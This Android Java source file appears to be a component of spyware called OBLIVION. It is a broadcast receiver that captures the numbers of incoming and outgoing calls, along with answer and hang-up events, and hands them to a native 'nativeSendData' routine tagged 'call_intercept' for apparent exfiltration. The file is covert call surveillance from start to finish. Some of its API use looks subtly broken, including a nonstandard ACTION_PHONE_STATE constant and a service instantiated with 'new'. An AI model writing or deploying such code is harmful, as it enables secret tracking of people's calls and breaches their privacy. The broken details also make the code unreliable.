package com.OBLIVION.agent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneStateReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_PHONE_STATE)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            
            OBLIVIONService service = new OBLIVIONService();
            
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                // Incoming call
                Log.d("OBLIVIONCall", "Incoming call from: " + number);
                service.nativeSendData("call_intercept", "{\"type\":\"incoming\",\"number\":\"" + number + "\"}");
            } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
                // Call answered
                Log.d("OBLIVIONCall", "Call answered: " + number);
                service.nativeSendData("call_intercept", "{\"type\":\"answered\",\"number\":\"" + number + "\"}");
            } else if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
                // Call ended
                Log.d("OBLIVIONCall", "Call ended");
                service.nativeSendData("call_intercept", "{\"type\":\"ended\"}");
            }
        } else if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Log.d("OBLIVIONCall", "Outgoing call to: " + number);
            OBLIVIONService service = new OBLIVIONService();
            service.nativeSendData("call_intercept", "{\"type\":\"outgoing\",\"number\":\"" + number + "\"}");
        }
    }
}